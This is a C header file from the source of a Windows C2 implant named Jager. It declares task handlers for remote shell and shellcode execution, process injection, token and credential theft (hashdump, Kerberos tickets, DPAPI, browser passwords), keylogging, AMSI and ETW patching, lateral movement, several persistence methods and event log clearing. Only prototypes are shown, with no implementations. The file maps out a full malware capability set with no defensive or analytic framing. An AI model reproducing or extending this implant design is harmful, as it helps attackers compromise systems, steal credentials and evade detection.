#ifndef JAGER_TASKS_H
#define JAGER_TASKS_H

#include <windows.h>
#include "config.h"
#include "transport.h"

// Task dispatcher
BOOL task_dispatch(PIMPLANT_CONFIG config, PC2_TASK task, PC2_RESULT result);
void tasks_process_batch(PIMPLANT_CONFIG config, PC2_TASK tasks, DWORD count);

// Core tasks
BOOL task_sleep(PIMPLANT_CONFIG config, BYTE *data, DWORD size);
BOOL task_exit(PIMPLANT_CONFIG config);
BOOL task_self_delete(PIMPLANT_CONFIG config);

// Execution tasks
BOOL task_shell(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_powershell(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_execute(BYTE *data, DWORD size, PC2_RESULT result);

// Filesystem tasks
BOOL task_ls(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_cd(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_pwd(PC2_RESULT result);
BOOL task_cat(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_upload(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_download(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_rm(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_mkdir_cmd(BYTE *data, DWORD size, PC2_RESULT result);

// Process tasks
BOOL task_ps(PC2_RESULT result);
BOOL task_kill_process(BYTE *data, DWORD size, PC2_RESULT result);

// Pivot tasks (tasks_pivot.c)
BOOL task_socks_start(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_socks_stop(PC2_RESULT result);
BOOL task_portfwd_add(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_portfwd_remove(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_rportfwd_add(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_rportfwd_remove(BYTE *data, DWORD size, PC2_RESULT result);

// P2P tasks (tasks_pivot.c)
BOOL task_p2p_listen(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_p2p_connect(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_p2p_relay(BYTE *data, DWORD size, PC2_RESULT result);

// Post-ex tasks (tasks_postex.c)
BOOL task_bof(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_shellcode(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_execute_assembly(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_inline_execute(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_cp(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_mv(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_timestomp(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_spawn(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_inject(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_migrate(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_ifconfig(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_netstat(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_portscan(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_token_steal(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_make_token(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_revert_token(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_hashdump(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_kerberos_tickets(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_dpapi(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_logon_user(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_sleep_mask(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_unhook(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_patch_etw(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_patch_amsi(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_module_stomp(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_threadless_inject(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_lateral_psexec(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_lateral_wmi(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_lateral_dcom(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_lateral_winrm(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_lateral_schtask(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_persist_registry(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_persist_service(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_persist_schtask(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_persist_com(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_persist_dll_sideload(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_screenshot(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_keylog_start(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_keylog_stop(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_clipboard(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_browser_creds(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_defense_clear_eventlog(BYTE *data, DWORD size, PC2_RESULT result);
BOOL task_arp_scan(BYTE *data, DWORD size, PC2_RESULT result);

// Output buffer helpers
typedef struct _OUTPUT_BUFFER {
    BYTE  *data;
    DWORD  size;
    DWORD  capacity;
} OUTPUT_BUFFER, *POUTPUT_BUFFER;

POUTPUT_BUFFER output_new(DWORD initial_capacity);
BOOL output_write(POUTPUT_BUFFER buf, const BYTE *data, DWORD size);
BOOL output_printf(POUTPUT_BUFFER buf, const char *fmt, ...);
void output_free(POUTPUT_BUFFER buf);

#endif // JAGER_TASKS_H
